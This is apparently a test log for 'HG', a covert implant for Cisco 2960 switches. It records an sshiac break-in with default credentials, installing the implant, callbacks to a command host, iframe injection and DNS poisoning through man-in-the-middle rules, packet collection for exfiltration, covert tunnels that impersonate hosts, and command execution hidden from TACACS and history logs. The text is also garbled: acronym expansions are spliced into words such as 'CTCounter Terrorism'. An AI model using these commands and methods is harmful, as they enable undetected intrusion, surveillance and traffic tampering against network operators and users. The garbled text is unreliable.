@@ -1,0 +1,620 @@
+
+                        Owner: User #71467
+Aquaman-5h HG 3.3.1 - Full Test
+Aquaman-5h HG 3.3.1 - Full Test
+Xetrron delivered Aquaman-5h HG 3.3.1 with a fix to EAREnterprise Archive 5244 (snooping causing err-disable).  Plan is to perform a full test of this Aquaman delivery.
+Testing Summary
+Completed
+
+HG Base - includes install/uninstall. command and control, ci profile, boundary test
+EAR 5244 fix verified
+SMITE - mitm create http_iframe
+DIVRT - mitm create dns_replace_ip
+ARP survey - socket get_arp_survey_data
+ARP responder - socket get_arp_responder_activity
+Scavenger - Packet Collection - collect rule
+ACE module - cmd exec
+Drillbit/Dualor - Covert Tunnel testing
+CPU Scaling - Curveball - device cpu
+Covert Action - Reboot and kill soft
+
+For Follow-Up
+
+Need to compare files from CIConcern Profile tests
+Five second CPU peaks are lower with HG installed than without - ~7-8% versus 11-13% - evident on show proc cpu hist.  Confirmed that this does not occur with just IACInternational Access Code installed.  In the chart below, on the right was when switch booted up, I installed IACInternational Access Code at the 67% User #75209, and I installed HG at the 24% User #75210.  After that it, it stays at 7%.                                    1  211 1111111111111111 11611111111111111111    7777777777777727744281112221122111211722710122111110112211CPU% per minute (last 60 minutes)
+CPU scaling does not seem to affect five second interrupt utilization
+CPU scaling does not hide utilization on individual processes - can be evident from show proc cpu sorted that sum of processes below add up to more than total reported at top
+SSHIAC attack logs an SNMPSimple Network Management Protocol trap for configuration change
+Usability feedback - it is confusing that some modules are started and stopped by different names.  For example, "module stop ACE" will stop the ACEApplication Control Engine (Module) module, but "module start ACEMod.mod" starts.  Tunnel is the same way - "module stop Tunnel" to stop, but "module start CovertTunnel.mod" to start.
+Scramble - output of "scramble status" shows more Matched Packets than we set - seems to count packets that are replies to traffic that was matched.
+
+Remaining Tests
+
+Auto Exfiltration tests
+Covert Data Collection to Drop Point tests
+DNS Check-in
+Memory cloaking
+Packet Collection to Drop Point
+Packet scambler
+RFS test
+Redirection
+Performance tests
+Ad-hoc tests
+Comms over other ports/protocols?
+Do we need to test HG in Script Mode?
+
+ 
+Progress/Notes
+4/16/15
+
+
+Collect Baseline information for use in later comparisons
+
+Deleted all previous crashinfo files from flash card of Target Device
+Reloaded Target Device
+Collected baseline files with output of show tech, dir all, show mem and CPU, show log
+Used memory - 26975916 (b)
+CPU - 5%/0%; one minute: 6%; five minutes: 6%
+
+
+Ran RANCID - collected version 1.6
+
+
+
+Install/Uninstall HG without leave behind
+
+SSHIAC attack - ./sshiac --ip 172.31.255.14:22 --l cisco:cisco password
+LG EC-125 DHDiffie-Hellman encryption EC-60 EC-159 M - these codes are acceptable per readme
+Observed CPU during attack: 46% highest spike
+Used memory after SSHIAC attack - 26966496 (b)
+
+
+Install HG
+Left the interpacket delay at 1s (not directed to change it in readme, and I'm following the readme)
+hg_start - result success - Result: 0x00000001
+
+Observed CPU during install: 19% highest CPU spike
+Used memory after HG install - 29893996 (b)
+no commands from attack or install observed in show history
+
+
+Establish HG Comms
+Edited aquaman-5h.txt file - replaced <INT> with eth0 and <IP TO TRIGGER> with 192.168.21.10
+Ran prep-ct.sh
+Established CTCounter Terrorism session - Observed 19% spike during SSLSecure Socket Layer handshakebeacon call_base_back https 172.20.12.22 443
+
+Used memory after CTCounter Terrorism session - 29863488 (b)
+Hit tab twice:[192.168.21.10]>aliases ca collect device encryption https mitm packet redir tunbeachhead capability communication dns file ilm mode process scramble verbositybeacon cmd compression ebroker filesystem memory module quit socket web
+
+
+Capability
+Module
+Installed?
+
+
+SMITE (iframe injection)
+FilterBroker
+Yes
+
+
+Scavenger (Packet Collector)
+ 
+ 
+
+
+Beacon
+ 
+ 
+
+
+Ramjet (Data Collector)
+DataCollection
+No
+
+
+Thundercracker (automated exfil)
+ 
+ 
+
+
+Mixmaster (packet scrambler)
+ 
+ 
+
+
+ACE (command execution)
+ACE
+Yes
+
+
+Drillbit (covert tunnel)
+Tunnel
+Yes
+
+
+DNS Check-in
+ 
+ 
+
+
+Scrapper (redirector)
+ 
+ 
+
+
+DIVRT (dns poison)
+FilterBroker
+Yes
+
+
+Snooping
+ 
+Yes
+
+
+Trigger
+ 
+Yes
+
+
+ARP Survey (socket)
+ 
+Yes
+
+
+ 
+ 
+ 
+
+
+ 
+ 
+ 
+
+
+ 
+ 
+ 
+
+
+ 
+ 
+ 
+
+
+
+HG Base version 3.3.1
+
+
+Uninstall HG
+device uninstall_hg -mp -f
+no syslog messages generated
+Used memory after uninstall 26954800 (b)
+Observed CPU during uninstall - 12%
+Output from show proc cpu history - shows slightly lower peak CPU for one minute with HG installed (7-8% with HG vs 9-11% without HG)
+After uninstall - CPU utilization for five seconds: 5%/0%; one minute: 6%; five minutes: 6%4/17/15
+
+
+
+
+
+Install/Uninstall HG with leave behind
+
+Reloaded to start with a clean Target Device
+SSHIAC attacked successfully
+Installed hg with leave behind
+No syslogs, cpu and mem as expected, nothing alerting in show history
+Establish HG comms - success, no alerting events
+Uninstall HG
+device uninstall_hg -f
+After uninstall, was able to successfully communicate with remote - broad
+
+
+Reinstall HG
+hg_start_leave_behind - successEstablished comms
+
+device uninstall_hg -mp -f
+
+
+
+Basic command and control
+
+module show - modules running
+module stop Trigger - success
+module start Trigger.mod - success
+ilm refresh - success
+module show - success - Trigger module running
+
+
+
+Hit tab key to verify output of available commands
+
+mitm present, collect present - refer to table in 2c for complete listing
+dns show, web show, https show - snoop enabled for all three
+dns get_snooped_host_list_client 0 100 - seeds host in snooped list
+
+
+
+Boundary Test
+Run through list in HG Base Smoke Test Procedure - all failed gracefully
+
+
+CI Profile
+
+Collect output for comparison before install, with hg and after uninstall of hg- collected output in new files, will compare to previous test output
+Added to Rancid and ran once with HG, then uninstalled hg, reloaded switch, and ran rancid again to compare
+RANCID - ran with HG installed - no change to config, still on version 1.6
+RANCID - ran after uninstall - no change, still on version 1.6
+
+
+
+Test Fix for EAREnterprise Archive 5244 - err-disable condition
+
+Reloaded to start with a clean Target Device
+SSHIAC and HG install
+Verify Seeds Traffic running and verify no CTCounter Terrorism session with HG
+Perform 10x service network restarts on Seeds VM
+Establish CTCounter Terrorism session
+Perform 10x service network restarts on Seeds VM
+No err-disable condition observed
+
+
+
+SMITE Smoke Test - following documented HG 3.3.0 SMITE Capability Smoke Test Procedure
+
+Start with a clean, reloaded 2960-S
+SSHIAC attack and HG install
+Established CTCounter Terrorism session
+Completed module control test - stop, start - did not complete module delete and reload test
+Did not test module persistence
+Created SMITE rule - mitm create http_iframe 192.168.21.10 255.255.255.0 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -en -bc -bk
+Iframe is injected into web page, viewed in source URL
+Able to attach in Windex and view secrets.txt
+Deleted mitm rule - iframe no longer injected
+
+
+
+Smoke Test - socket get_arp_survey_data
+
+Reload switch to start with a clean Target Device
+SSHIAC attack and install HG
+
+Establish CTCounter Terrorism session
+
+
+type socket get_arp_survey_data:[192.168.21.10]> socket get_arp_survey_data[Success] Vlan: 1Sender Protocol Address Sender Hardware Address Target Protocol Address Time Last Updated 192.168.21.10 00:50:56:88:25:6d 192.168.21.1 2015-04-17T11:59:48Z 192.168.21.1 00:11:bb:89:21:c4 172.31.255.1 2015-04-17T11:59:07Z 192.168.21.10 00:50:56:88:25:6d 192.168.21.10 2015-04-17T11:39:58Z 0.0.0.0 00:50:56:88:25:6d 192.168.21.10 2015-04-17T11:39:52Z
+
+socket get_arp_responder_status shows ARPAddress Resolution Protocol responder enabled Yes
+socket clear_arp_survey_data
+Checked socket get_arp_survey_data again and only 1 entry now, all re-appeared after service network restart on seeds
+
+
+
+Smoke Test - Collect Capability
+Establish CTCounter Terrorism Session with HG
+Collect create 192.168.21.10 255.255.255.0 0 65535 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 0 65535 tcp -en
+This rule captures Seed traffic
+In Listen window, observed "collect success received collected data" messages with job numbers
+Collect status showed active sessions and captured sessions
+Typed collect disable 8 to disable the collection rule
+Collect status showed 0 bytes buffered
+Viewed collected data in /Logs by converting to PCAPPacket capture format with ExfilParsh.sh - saw our seeds data
+
+
+Smoke Test - ACEApplication Control Engine (Module) Capability
+
+Set up for test - configured Target Device for use with AAASecurity Server from Cisco Server
+Verified that Target Device is logging commands to AAASecurity Server from Cisco server log - /var/log/tac_plus.acct
+Established CTCounter Terrorism session with HG
+In trigger window, ran "capability show" which confirms ACEApplication Control Engine (Module) v24 is installed.
+In trigger window, ran "module show" which confirms the same as above and that the module is "running".
+In trigger window, issued "module restart default:ACE.mod" and received error stating that it was an invalid module name despite it being what showed in the previous output.
+In trigger window, issued "module stop default:ACE.mod" and received the same error above.
+Previously configured TACACS+ server
+
+Configured the 2960S target as follows for AAA:
+
+aaa new-model 
+! 
+! 
+aaa authentication password-prompt Password: 
+aaa authentication username-prompt Login: 
+aaa authentication login default local 
+aaa authentication enable default enable 
+aaa authorization exec default local 
+
+aaa accounting exec default none
+aaa accounting commands 0 default start-stop group tacacs+aaa accounting commands 1 default start-stop group tacacs+aaa accounting commands 2 default start-stop group tacacs+aaa accounting commands 3 default start-stop group tacacs+aaa accounting commands 4 default start-stop group tacacs+aaa accounting commands 5 default start-stop group tacacs+aaa accounting commands 6 default start-stop group tacacs+aaa accounting commands 7 default start-stop group tacacs+aaa accounting commands 8 default start-stop group tacacs+aaa accounting commands 9 default start-stop group tacacs+aaa accounting commands 10 default start-stop group tacacs+aaa accounting commands 11 default start-stop group tacacs+aaa accounting commands 12 default start-stop group tacacs+aaa accounting commands 13 default start-stop group tacacs+aaa accounting commands 14 default start-stop group tacacs+aaa accounting commands 15 default start-stop group tacacs+
+
+tacacs-server host 10.9.8.25
+tacacs-server directed-request
+
+
+On tacacs server run: #tail -f /var/log/tac_plus.acct
+
+ssh to target 2960S: ssh -l root 172.31.255.14  [password=password]
+tacacs console shows login via ssh with other associate information
+
+Run various show commands via ssh session and confirm they show in the tacacs log as expected. [sh run, sh ver, sh clock, sh ip int br, sh int status, sh flash, sh users all]
+
+Cleared log file on tacacs and set up new tail of log file: #tail -f /var/log/tac_plus.acct
+From HG trigger window, run similar show commands as above and confirm they do NOT/NOT showing on tacacs log:
+HG trigger> cmd exec "show run"
+HG trigger> cmd exec "sh config"
+HG trigger> cmd exec "sh vlan"
+HG trigger> cmd exec "sh user"
+HG trigger> cmd exec "dir flash"
+HG trigger> cmd exec "sh clock"
+Enter a native command that requires a series of commands:
+HG trigger> cmd exec "sh ip int br"
+HG trigger> cmd exec "sh configuration id"
+HG trigger> cmd exec "sh dhcp server"
+HG trigger> cmd exec "sh int switch"
+HG trigger> cmd exec "sh int counters"
+HG trigger> cmd exec "sh int counters errors"
+HG trigger> cmd exec "sh int accounting"
+HG trigger> cmd exec "sh int irb"
+HG trigger> cmd exec "sh int mtu module 1"
+HG trigger> cmd exec "traceroute 1.1.1.1"  = success, with traceroute output
+HG trigger> cmd exec "ping 1.1.1.1" = success with round trip statistics
+HG trigger> cmd exec "traceroute 3.3.3.3" = successful in that output shows to a destination that cannot be reached
+HG trigger> cmd exec "ping 3.3.3.3" = successful in that out put of 0 replies is received
+Execute invalid commands and verify they fail gracefully:
+HG trigger> cmd exec "show test"
+HG trigger> cmd exec "sh home"
+HG trigger> cmd exec "traceroute 3.3.3.3"
+
+
+ssh back to target 2960S and confirm that Tacacs logs the connection. Run "sh history" and verify no commands executed via HG show.
+Load JQJThresher test on the IXIA which will run 85mbps of throughput through the test network that has 100mb link connecting the 3750G core and the 2960S for 10 minutes.During the IXIA throughput test, execute the "show" and other commands previously listedAll commands completed successfully. No output on Tacacs log or Show History on device.
+
+
+
+
+Smoke test and functional Tunnel/Drillbit/Dualer capability
+
+Establish Dualer tunner from 192.168.21.12 tap IP on 2960S to CT-ICON
+Edit hg/tools/dualor/config/dualor-endpoint.ini
+Change General Int to "eth0",
+Change Trigger IP to real to be a destination for trigger packet: "192.168.21.10"
+Ensure CommsH LocalPort = 444
+
+
+Edit hg/tools/dualor/config/dualor-callback.ini
+Change TapIPAddr to non-active IP on destination subnet = 192.168.21.12
+Change VLANVirtual Local Area Network to destination vlan = 1
+Change Remote = CTCounter Terrorism IP "172.20.12.22"
+Ensure port = 444
+Change IParams to impersonation IP = 192.168.21.10
+Change IParams MACApple Operating System (MACApple Operating System of impersonation IP) = 00:50:56:88:25:6d
+Change TTLTime To Live = 255
+Change VLANVirtual Local Area Network to impersonation vlan = 1
+
+
+Establish CTCounter Terrorism session to Aquament-5h instance on 2960S
+Start tunnel listener on port 444 from workspace terminal
+Run: hg/tools/dualor/linux# ./Dualor ../config/dualor-endpoint.iniNote: "Listening for clients on port 444..."
+
+From CTCounter Terrorism listen window: tun init tools/dualor/config/dualor-callback.iniNote: Receive successful SSLSecure Socket Layer Handshake in workspace listener window on port 444 with tap0 interface on CTCounter Terrorism with impersonated IP
+
+Add a route to ICON-CT for X.X.X.X (LVLT-GOGL-8-8-8[US])/24 to use tap0 interface - route add -net X.X.X.X (LVLT-GOGL-8-8-8[US])/24 dev tap0 (Gives CT-ICON session the ability to browse to website as 192.168.21.12)Note: TCPdump -i eth0 (From the X.X.X.XX (LVLT-GOGL-8-8-8[US]) webserver confirms source traffic as 192.168.21.12)
+
+
+
+Trigger from another HG implanted switch back through the tunnel of the 2960S to CT-ICON on 192.168.21.12
+
+
+Trigger and Callback through a HG Tunnel running Aquaman-3h on 2960(non S)
+Confirmed 2960#1 running 12.2(50)SE5
+
+Disabled setting in Aquaman-5h HG tunnel which will disable the tunnel if the tap IP becomes active (If necessary - only on version of HG that created tap0 interface. For this instance of the test, this does not need to be done)
+Edit hg/config/tunnel.ini and change DetectTAPSrcTraffic=Yes to No
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = Yes
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg tunnel.ini and note in the output that DetectTAPSrcTraffic has been changed to No
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = No
+From Aquaman-3h CutThroat (Listen window), type file put cfs/000000004B8FAF63.cfg default:000000004B8FAF63.cfg in order to load the new setting up to HG
+
+From Aquaman-3h CutThroat (Listen window), type module restart default:CovertTunnel.mod to restart the moduleThis did not work initially and Xetron is aware of this problem.  To fix, try restarting again, and run ilm refresh.
+
+
+
+Implanted 2960#1 with Aquaman-3h delivery of HG
+Edited "target aliases" file with 192.168.0.101 target and procid = 0x10413440
+Edited "aquaman3h-txt to include:
+General > Interface: tap0
+Trigger address: 192.168.44.39
+CommsH: Local port = 446
+
+
+Established comms with Aquaman-3h from ICON-CT on port 446
+ilm listen aquman-3h.txt (in listen window - listening on 446)
+beacon call_me_back https 446 -ii 192.168.44.38 (in trigger window)
+Successful SSLSecure Socket Layer handshake and established comms.
+Verify tap0 traffic on Wireshark from CT-ICON
+
+
+
+
+
+
+
+ARP Survey  - Smoke Test
+Test the ability to collect host information
+In CT-ICON Listen window: socket get_arp_survey_dataNote: HG collected a table of expected IP and associated MAC's
+
+Listen window: socket clear_arp_survey_data= success
+
+Listen window: socket get_arp_survey_dataNote: Less IP/MAC entries than previously since table is repopulating
+
+Start IXIA JQJThresher test with 150 hosts in network neighborhoodcmd: socket get_arp_survey_data
+= ARPAddress Resolution Protocol table is populated with IXIA traffic
+Note: only the most recent 32 addresses show in the survey
+
+
+
+
+
+
+
+CPU Scaling - Smoke Test
+
+Ensured CPU scaling was disabled - device cpu show
+Created a collect rule for all traffic to create high CPU and CPU interruptscollect create 0.0.0.0 0.0.0.0 0 0 0.0.0.0 0.0.0.0 0 0 tcp -en
+
+Started IXIA traffic test to generate traffic to raise the COU
+Noted CPU levelsCPU utilization for five seconds: 22%/11%; one minute: 14%; five minutes: 9%
+
+
+Enabled CPU scaling and noted CPU levels
+
+device cpu set_bounds 5 10
+CPU utilization for five seconds: 5%/13%; one minute: 5%; five minutes: 5%
+
+
+
+
+Found that CPU scaling does not seem to affect the second number for the 5 second CPU (the interrupt level).  I believe this is a known issue, but need to double check.
+Found that the output of a show proc cpu sorted reveals that the sum total of the CPU used is more than the total being reported at the top.  I believe this is a known issue, but need to double check.
+
+
+
+CA - Smoke Test
+
+
+Issued "ca reboot" in ICON-CT
+
+Target Device rebooted
+Target Device reports in show version output: Last reset from power-on and System returned to ROMRead-Only Memory by power-on
+No crashinfo file generated
+No alerting snmp traps or syslogs on console during reboot
+
+
+Issued a ca reboot while ca soft kill was in effect - no alerting snmp traps or syslog messages generated, target device reloaded
+
+
+
+CA Soft Kill test
+
+Issued "ca kill soft 5 60"
+ICMP packets were dropped for the duration of the soft kill and resumed normally
+CT session remained responsive
+No alerting syslog messages seen on console
+Packets resumed passing on schedule
+
+
+Issued "ca soft kill 5 300"
+reloaded Target Device during kill duration, device reloaded normally
+Re-attacked with sshiac and installed HG and established CTCounter Terrorism session- snmp trap for config change observed during IACInternational Access Code attack
+snmp traps all enabled with the exception of syslog traps, traps enabled to be sent to Solarwinds
+SSHIAC attack and observe the SNMPSimple Network Management Protocol message:CISCO-CONFIG-MAN-MIB:ciscoConfigManEvent 
+
+
+
+
+
+
+
+Smoke Test - socket get_arp_responder_status
+
+Established a CTCounter Terrorism session using seeds host as trigger and then verified that arp responder was enabled but not used for current connection
+Disconneced CTCounter Terrorism session and took seeds host offline
+Restablished CTCounter Terrorism session with snooping and checked the arp responder activity - it was still not used
+Disconnected CTCounter Terrorism session and cleared arp on Target Device and reconnected CTCounter Terrorism session - it still was not used
+Disconnected CTCounter Terrorism session and attempted to reestablish and force it to use a non existent host to impersonate - would not connect
+attempted both beacon_call_me_back and beacon_call_base_back with -ii 192.168.21.40
+wireshark shows HG attempt to make an ssl cx to CT, CTCounter Terrorism sends 4 syn-acks, then HG sends another SYN
+Is arp responder not getting the arp request or not responding for 192.168.21.40?
+Cleared arp on 2960#1 as well as upstream 3750, and now using Seeds host IP no longer works for CTCounter Terrorism session
+Turned up seeds host interface and sent a ping to it from the 3750 and then the interface on Seeds back down - this repopulated the 3750 arp table with and entry for 192.168.21.10
+Attempted to establish CTCounter Terrorism session impersonating 192.168.21.10 and it works
+Cleared arp on 3750 while CTCounter Terrorism session was active, and the session drops.  Turned int on Seeds back up and tried to reestablish CTCounter Terrorism session impersonating seeds IP and it works.
+Seems that arp_responder isn't responding for 192.168.21.10
+
+
+Attempted to connect a CTCounter Terrorism session and force HG to impersonate a real host - works
+Allowed HG to snoop to impersonate traffic, but disabled seeds host interface eth1 and cleared arp on 3750 before attempting to establish the CTCounter Terrorism session.  Session established using ARPAddress Resolution Protocol responder.  Repeated this test using both beacon call_me_back https 172.20.12.22 443 and beacon call_me_back https 443 - sessions both established using ARPAddress Resolution Protocol responder.
+
+
+
+DIVRT Smoke Test
+
+Created a DIVRTDigital Imaging & Video Recovery Team rule in HGmitm create dns_replace_ip 192.168.21.11 255.255.255.0 4.4.4.4 255.255.255.0 www.google.com:172.20.13.20 -en -ttl 1
+
+Tested from 192.168.21.11 (windex target) and saw that DNSDomain Name System responses were modified to reply with 172.20.13.20.  Captured in wireshark and verified the modified DNSDomain Name System reply, used web browser and received the web page from 172.20.13.20 when browsing to www.google.com
+
+Added an additional rule for the same DNSDomain Name System request, but with a different modified response - behaved as iframe did - both rules were accepted however only lowest numbered rule took effect.
+Deleted lowest numbered rule and now the remaining rule took effect
+Attempted to delete the mitm rule while a session was active, HG gave an error to say a session was active, the rule will be deleted when all sessions are complete.
+Verified that after session was complete, rule was deleted.
+Stopped and started FilterBroker module, and then re-entered rule.  Verified rule still taking effect on Victim.
+Disabled and deleted mitm rule
+
+
+
+MixMaster
+
+scramble create random_data 192.168.21.10 255.255.255.0 0 0 0.0.0.0 0.0.0.0 0 0 tcp -en
+Observed seed traffic impacted by scramble rule at times, however the results we got were not consistent.  Need to continue testing scramble to determine why at times a rule that should have worked did not fire.  Could be related to IXIA traffic or number of rules.
+Observed matched packets in output of scramble status to be too high - looks like it's counting return traffic as well as traffic that matches our rule
+
+
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 
+| 16 
+| 17 
+| 18 
+| 19 
+| 20 
+| 21 
+| 22 
+| 23 [Xetron]
+| 24 [Xetron]
+| 25 [Xetron]
+| 26 [Xetron]
+| 27 [Xetron]
+| 28 [Xetron]
+| 29 [Xetron]
+| 30 [Xetron]
+| 31 [Xetron]
+| 32 [Xetron]
+| 33 [Xetron]
+| 34 [Xetron]
+| 35 [Xetron]
+| 36 [Xetron]
+| 37 [Xetron]
+| 38 [Xetron]
+| 39 [Xetron]
+| 40 [Xetron]
+| 41 [Xetron]
+| 42 [Xetron]
+| 43 [Xetron]
+| 44 [Xetron]
+| 45 [Xetron]
+| 46 [Xetron]
+| 47 [Xetron]
+| 48 [Xetron]
+| 49 [Xetron]
+| 50 [Xetron]
+| 51 [Xetron]
+| 52 [Xetron]
+| 53 [Xetron]
+| 54 [Xetron]
+| 55 [Xetron]
+|
+                    
